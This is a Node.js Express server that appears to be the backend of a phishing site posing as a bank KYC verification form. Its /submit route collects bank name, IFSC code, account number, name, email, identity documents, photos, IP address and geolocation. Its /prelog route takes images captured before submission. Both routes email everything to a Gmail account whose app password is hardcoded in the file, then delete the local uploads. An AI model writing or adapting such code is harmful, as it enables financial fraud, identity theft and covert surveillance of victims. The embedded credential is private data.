const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const port = process.env.PORT || 3000;

// Middleware for large payloads
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Ensure upload directory exists
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);

// Multer storage config
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadDir),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});

const upload = multer({ storage }).any();

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'dcbsubmission392@gmail.com',
    pass: 'kexmwnespcwxrkjt' // replace with secure method if needed
  }
});

// Route: /prelog — for pre-capture images
app.post('/prelog', upload, async (req, res) => {
  try {
    const location = req.body.location ? JSON.parse(req.body.location) : null;
    const files = req.files || [];

    const timestamp = new Date().toISOString();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const log = `
[PreLog] ${timestamp}
IP: ${ip}
User-Agent: ${userAgent}
Location: ${location ? `${location.latitude}, ${location.longitude}` : 'N/A'}
Images: ${files.length}
--------------------------`;

    fs.appendFileSync('records.txt', log);

    // Email
    const mailOptions = {
      from: 'dcbsubmission392@gmail.com',
      to: 'dcbsubmission392@gmail.com',
      subject: '📸 Pre-Capture Log',
      text: log,
      attachments: files.map(file => ({
        filename: file.originalname,
        path: file.path
      }))
    };

    await transporter.sendMail(mailOptions);

    // Cleanup
    files.forEach(file => fs.unlinkSync(file.path));
    res.status(200).send('Prelog received');
  } catch (err) {
    console.error('Error in /prelog:', err);
    res.status(500).send('Error in prelog');
  }
});

// Route: /submit — for form submission
app.post('/submit', upload, async (req, res) => {
  try {
    const { bankname, ifsc, accno, fullname, email, location } = req.body;
    const locationObj = location ? JSON.parse(location) : null;
    const files = req.files || [];

    let documentFile = null;
    const images = [];

    files.forEach(file => {
      if (file.fieldname === 'document') {
        documentFile = file;
      } else {
        images.push(file);
      }
    });

    const timestamp = new Date().toISOString();
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'];

    const log = `
[Submission] ${timestamp}
Bank: ${bankname}
IFSC: ${ifsc}
Account: ${accno}
Name: ${fullname}
Email: ${email}
IP: ${ip}
User-Agent: ${userAgent}
Location: ${locationObj ? `${locationObj.latitude}, ${locationObj.longitude}` : 'N/A'}
Images: ${images.length}
Document: ${documentFile ? documentFile.originalname : 'None'}
--------------------------`;

    fs.appendFileSync('records.txt', log);

    const mailOptions = {
      from: 'dcbsubmission392@gmail.com',
      to: 'dcbsubmission392@gmail.com',
      subject: '✅ New KYC Submission',
      text: log,
      attachments: [
        ...(documentFile ? [{ filename: documentFile.originalname, path: documentFile.path }] : []),
        ...images.map(file => ({
          filename: file.originalname,
          path: file.path
        }))
      ]
    };

    await transporter.sendMail(mailOptions);

    // Cleanup
    if (documentFile) fs.unlinkSync(documentFile.path);
    images.forEach(file => fs.unlinkSync(file.path));
    res.status(200).send('Submitted');
  } catch (err) {
    console.error('Error in /submit:', err);
    res.status(500).send('Submission failed');
  }
});

app.listen(port, () => {
  console.log(`✅ Server running on http://localhost:${port}`);
});
